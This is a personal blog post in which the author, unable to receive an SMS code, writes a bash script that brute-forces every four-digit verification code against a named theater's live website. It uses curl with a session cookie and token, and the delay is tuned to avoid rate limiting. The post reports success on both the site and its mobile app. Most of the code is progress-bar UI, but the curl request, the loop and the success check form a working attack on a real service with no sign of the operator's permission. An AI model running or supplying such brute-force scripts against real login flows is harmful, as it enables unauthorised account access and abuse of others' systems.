---
layout: post
title: Unlocking the Theater Experience
author: borko
description: What to do when phone registration simply does not work on some website
  and you really need to log in? Sometimes brute-force can be appropriate. This is
  a story of one such example.
categories:
- reverse-engineering
tags:
- brute-force
- bash
- scripting
image: "/assets/img/posts/2024-01-10-unlocking-the-theater-experience/thumbnail.png"
date: 2024-01-12 21:48 +0100
---
## New plays in local theater

Recently I stumbled upon an advertisement for the local theater. From time to time I like to bring my kids to a theater as they enjoy it. Wow, there is a play that I can bring my daughter to: "The Snow Queen"!

## Entering mobile application

So I opened up the mobile application for a theater in order to buy tickets. My account expired some time ago and I needed to register again.

And here comes the problem: I entered my phone number, but I didn't receive the verification code by SMS.

![Registration over the mobile application](/assets/img/posts/2024-01-10-unlocking-the-theater-experience/mobile-verification.png){: .shadow style="max-width: 90%;max-height: 500px" }
_Registration over the mobile application_


Then, after 60 seconds I could try again, but still without success...

Most likely their subscription plan expired and they didn't check it in time.

## Trying over website

I thought to myself "Maybe I got my account still logged in over their website. Let's try it.

![Registration over website](/assets/img/posts/2024-01-10-unlocking-the-theater-experience/website-verification.png){: .shadow style="max-width: 90%; max-height: 300px" }
_Registration over website_

Ah, no luck again!

But wait, let me try entering some common number sequences:

```
0000
1234
9999
1111
9876
```

No... It was not a great idea anyway.

## Plan

Ok, so we can assume a few things here:

- verification code is a sequence of 4 digits (based on mobile application input)
- the sequence is generated once we ask for the verification code by SMS
- there is no limit to the number of retries for entering the verification code

This sounds like a nice brute-forcing practice, isn't it?

What we have here is a classic "Permutations with Repetition" example.

> For more details, check this article: [Combinations and Permutations](https://www.mathsisfun.com/combinatorics/combinations-permutations.html)
{:.prompt-info}

Ok, so we got:

```
Number of permutations = n^r

n - number of possibilities
r - number of appearances

In our case: 10^4 = 10 000
```

But it's ten thousand combinations! It would take so much time to run it manually.....

On the other hand, what if we used some script that would do this for us 🤔

Let's say that we run each combination once per 150ms, it would take us the maximum time of:

```
10 000 * 150ms = 1 500 000ms = 1 500s = 25m
```

Why 150ms? Simply because we don't want to make a bunch of requests to a server at once, to avoid rate-limiting or similar mechanisms. It's still a risk with 150ms as well, but let's hope it will work.

## Code

For this purpose, I decided to use the bash script.

Let's do this step by step.

> If you're eager to see the final result, you can jump to [Running the application](#running-the-application) section.
{:.prompt-info}

### Iterate over all combinations

The first step is to go over all possible combinations with delay. It should be quite easy:

```sh
#!/bin/bash

for i in {0000..9999}; do
    echo "Code: $i"
    sleep 0.15
done
```

![Iterate over all combinations with delay](/assets/img/posts/2024-01-10-unlocking-the-theater-experience/code_part_1.gif){: .shadow style="max-width: 90%" }
_Iterate over all combinations with delay_

### Introduce UI

Instead of having the application constantly printing out to a terminal, wouldn't it be nicer to simply refresh the view itself?

> We'll go into details of setting up UI. If you want to skip this, you can jump straight to [Preparing the curl](#preparing-the-curl) section.
{:.prompt-info}

Let's define what UI we would like to have:
- title
- current code that is being tested
- a result of that test
- progress bar
- time elapsed


```sh
#!/bin/bash

DELAY=0.15

printLayout() {
    echo
    echo "Brute force attack"
    echo
    echo "Code:"
    echo "Result:"
    echo
    echo '/ ..................................................   (0%)'
    echo
    echo "Time elapsed: 0 seconds"
}

main() {
    printLayout

    for i in {0000..9999}; do
        # echo "Code: $i"
        sleep $DELAY
    done
}

main

```
{: .highlight style="max-height: 500px" }


![Create UI](/assets/img/posts/2024-01-10-unlocking-the-theater-experience/code_ui.png){: .shadow style="max-width: 90%" }
_Create UI_

### ANSI Escape characters

As we would like to move our cursor in different directions and change color in some places of UI, we need to use ANSI escape characters.

To use them, we should use `echo -ne`, where `n` stands for `not outputting trailing newline` and `e` stands for `enable interpretation of backslash escapes`

Let's add some of them as variables for ease of use to the code:

```sh
# ANSI escape codes

ESCAPE="\x1B"

SAVE_CURSOR="$ESCAPE[s"
RESTORE_CURSOR="$ESCAPE[u"
BOLD="$ESCAPE[1m"
RED="$ESCAPE[31m"
GREEN="$ESCAPE[32m"
RESET_STYLE="$ESCAPE[0m"

MOVE_LINE_UP="$ESCAPE[1A"

...

moveLinesUp() {
    local n=$1
    local moves=""

    for ((i = 0; i < $n; i++)); do
        moves="$moves$MOVE_LINE_UP"
    done

    echo $moves
}

```

### UI Utility methods

It would be nice to have two methods that would:
- create a string of repeating characters
- format elapsed seconds into a more readable format of seconds, minutes, hours, days

```sh
repeatCharNTimes() {
    local n=$1
    local str=$2
    local result=""

    for ((i = 0; i < $n; i++)); do
        result="$result$str"
    done

    echo "$result"
}

formatTimeElapsed() {
    local seconds=$1
    local minutes=$((seconds / 60))
    local hours=$((minutes / 60))
    local days=$((hours / 24))

    if ((days > 0)); then
        echo "$days days, $((hours % 24)) hours, $((minutes % 60)) minutes, $((seconds % 60)) seconds"
    elif ((hours > 0)); then
        echo "$hours hours, $((minutes % 60)) minutes, $((seconds % 60)) seconds"
    elif ((minutes > 0)); then
        echo "$minutes minutes, $((seconds % 60)) seconds"
    else
        echo "$seconds seconds"
    fi
}
```

### Animate Code line

Let's start with the easy one: animating the line where we display the current code that is being tested:

```sh
echo -en "$SAVE_CURSOR $(moveLinesUp 6) \rCode: \t\t$BOLD$GREEN$i $RESET_STYLE $RESTORE_CURSOR"
```

Notes:
- SAVE_CURSOR and RESTORE_CURSOR are useful to bring the cursor to where it was before we started this change
- \r is used to go back to the beginning of the line

And we get something like this:

![Animating Code line](/assets/img/posts/2024-01-10-unlocking-the-theater-experience/animating_code_line.gif){: .shadow style="max-width: 90%" }
_Animating Code line_


### Animating progress bar

It's fairly easy to animate the progress bar. You simply calculate the percentage and use it to display the appropriate number of hash symbols and dots. Also, we include the percentage at the end of the progress bar:

```sh
MAX=9999

local percentage=$((10#$i * 100 / MAX))

pounds=$(repeatCharNTimes $percentage/2 '#')
dots=$(repeatCharNTimes $((50 - percentage / 2)) '.')

echo -en "$SAVE_CURSOR $(moveLinesUp 3) \r / $pounds$dots ($percentage%) $RESET_STYLE $RESTORE_CURSOR"

```

### Add spinner

The Spinner is a nice touch on the progress bar. It's fairly easy to add it, but it does involve some tricks.

What makes up the spinner is a sequence of characters:

```sh
# Spinner
sp='/-\|'
```

In our for loop, characters are wrapped around on each iteration with this nice trick:

```sh
# Move spinner
sp=${sp#?}${sp%???}
```

What this line does is that it makes a new string out of two parts:

- `${sp#?}` - this will expand string `sp` and drop a single character from the beginning (`#` followed by single `?`)
- `${sp%???}` - this will expand string `sp` and drop three characters from the end (`%` followed by three `?`)

We get the spinner with the utility method:

```sh
getSpinner() {
    local spinner=$(printf '\b%.1s' "$sp")

    echo $spinner
}
```

Which is simply getting the first character of the string `sp`

And finally, we can adjust our code to show the progress bar with the spinner at the beginning:

```sh
spinner=$(getSpinner)

echo -en "$SAVE_CURSOR $(moveLinesUp 3) \r $spinner $pounds$dots ($percentage%) $RESET_STYLE $RESTORE_CURSOR"
```

### Animate Time elapsed

The last thing on UI changes is to animate `Time elapsed`, which is straightforward:

```sh
start=$(date +%s)

...

main() {
    printLayout

    for i in {0000..9999}; do
    
    ...

    now=$(date +%s)
    elapsed=$((now - start))
    formattedTimeElapsed=$(formatTimeElapsed $elapsed)

    echo -en "$SAVE_CURSOR $(moveLinesUp 1) \rTime elapsed: $formattedTimeElapsed $RESET_STYLE $RESTORE_CURSOR"

```

UI is finally ready!

Here is what it looks like after all the changes:

![Expand with the progress bar and time elapsed](/assets/img/posts/2024-01-10-unlocking-the-theater-experience/code_part_2.gif){: .shadow style="max-width: 90%" }
_Expand with the progress bar and time elapsed_

Here is the complete code:

<script src="https://gist.github.com/borko-rajkovic/30566a13d24e2934bfae2fb2fbf983d4.js"></script>


### Preparing the curl

After some examination of the website, I noticed that the code is sent as a POST request together with the cookie and a token for successful validation.

In short, curl is in the following form:

```sh
curl 'https://pgpozoriste.me/phone/verify' -H "cookie: <cookie>" --data-raw "_token=<token>&code=<code>"
```

In our code right above the line `now=$(date +%s)`, we can make the HTTP request using **curl**:

```sh
        request=$(curl 'https://pgpozoriste.me/phone/verify' \
            -H "cookie: $cookie" \
            --data-raw "_token=$token&code=$i")
```

This request will need to go to a **redirect**, so we need to instruct the curl to do it for us by setting the flag `--location`.

Also, we don't want to pollute the terminal with the curl statuses, so we'll include `--silent` option as well.

The final request looks like this:

```sh
        request=$(curl 'https://pgpozoriste.me/phone/verify' \
            -H "cookie: $cookie" \
            --data-raw "_token=$token&code=$i" \
            --location --silent)
```

As you can see, it requires the `cookie` and `token` to be set, which we can write at the beginning of our script in variables of the same name.

Then, after the request, we can inspect for its content like this:

```sh
        result=$(echo $request | grep "Uneseni kod je pogrešan" | wc -l)

        if ((result == 1)); then
            echo -en "$SAVE_CURSOR $(moveLinesUp 4) \rResult: \t\t$BOLD$RED Uneseni kod je pogrešan $RESET_STYLE $RESTORE_CURSOR"
        else
            echo $request
            break
        fi
```

### Final code

The final code looks something like this:

<style type="text/css">
  .gist-file
  .gist-data {max-height: 500px}
</style>

<script src="https://gist.github.com/borko-rajkovic/a2c1d8f885432aaf62417b4e6d9d58cb.js"></script>

### Tuning up the DELAY parameter

As it turns out, 150ms was way too quick and I quickly got `Too Many Requests` error.

Trying out different values, I figured that for me it's safe to use `DELAY=5`, meaning that the maximum time for checking all combinations is `10000*5s=50000s`, or around 14 hours 😕

### Stop and continue

What is great is that you can always stop the script and just change `for` loop to start from the last checked sequence of digits.

> Just be careful if you stop it yourself to restart with the one combination before, as the terminal is showing the current `Code` being processed and not the previous.
{:.prompt-warning}

## Running the application

Here is the application in progress:

![Brute force in action](/assets/img/posts/2024-01-10-unlocking-the-theater-experience/brute_force_in_progress.png){: .shadow style="max-width: 90%;max-height: 500px" }
_Brute force in action_

After some time, we finally got a success:

![Success](/assets/img/posts/2024-01-10-unlocking-the-theater-experience/success.png){: .shadow style="max-width: 90%;max-height: 500px" }
_Success_

## The last catch before entering the website

The mistake I made right away after getting the verification code was that I tried to enter it again. But refreshing the page actually triggered another verification code generation!

Oh, time wasted on that.....

Inspecting the website a bit more I discovered that the website is holding a cookie.

Hm, ok then. So, if our code verification request is successful, does it mean that we can simply go to the home page and the cookie will make sure that we are logged in?

In other words, maybe there is no need to enter the verification code, as we just did it by the curl?

Let's try that. And... Yes! We are logged in, we just needed to go to the home page right away!


![Before code verification](/assets/img/posts/2024-01-10-unlocking-the-theater-experience/before_verification.png){: .shadow style="max-width: 90%;max-height: 500px" }
_Before code verification_

![After code verification](/assets/img/posts/2024-01-10-unlocking-the-theater-experience/after_verification.png){: .shadow style="max-width: 90%;max-height: 500px" }
_After code verification_

Comparing these two, you can clearly see that instead of `Prijavi se` (Log in), now it has `Moje ulaznice` (My tickets) in the top right corner.

> By the way, cookie I found is set to expire at `2025-02-13T12:47:57.084Z`, meaning we should be logged in for more than a year on this browser 🧐
{:.prompt-info}

## Seats are bought!

At last, I could go to a page for buying seats and although the first row was sold out, I found some nice seats in the second row (blue ones on the screen):

![Bought seats](/assets/img/posts/2024-01-10-unlocking-the-theater-experience/bought_seats.png){: .shadow style="max-width: 90%;max-height: 500px" }
_Bought seats_

Tickets are in place and we're set to go to a child's play in two weeks 🎭

## P.S. But hey Borko, what about the mobile app?

I'm glad you asked 😎

After I finished with the website, I tried to open the mobile application to use the same code.

But, it turns out that once you open the application, it asks for your phone number and then resets the verification code 😮

Ok, here we go again...

In short, I did the following:

- started mobile application, entered the phone number to get on the screen for entering code
- keep the application open in the background
- generate code via script as discussed before
- use that generated code to register a mobile application

And voila, it works!

Now I can have my tickets at the reach of my hand anytime 😌

![Mobile app registered](/assets/img/posts/2024-01-10-unlocking-the-theater-experience/mobile_app_registered.jpeg){: .shadow style="max-width: 90%;max-height: 500px" }
_Mobile app registered_
